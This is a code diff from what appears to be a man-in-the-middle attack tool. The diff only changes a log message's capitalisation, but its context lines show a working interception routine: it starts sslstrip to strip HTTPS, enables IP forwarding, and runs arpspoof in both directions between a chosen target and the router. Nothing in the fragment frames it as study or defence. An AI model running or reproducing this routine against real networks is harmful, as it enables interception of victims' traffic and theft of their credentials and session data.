@@ -47,7 +47,7 @@ def run():
 		subprocess.Popen('sslstrip -p -k -f', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 	printInfo("IP forwarding...")
 	subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-	printInfo("Arp spoofing...")
+	printInfo("ARP spoofing...")
 	arp_spoofing1 = 'arpspoof -i ' + variables['interface'][0] + ' -t ' + variables['target'][0] +' '+ variables['router'][0]
 	subprocess.Popen(arp_spoofing1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
 	arp_spoofing2 = 'arpspoof -i ' + variables['interface'][0] + ' -t ' + variables['router'][0] +' '+ variables['target'][0]
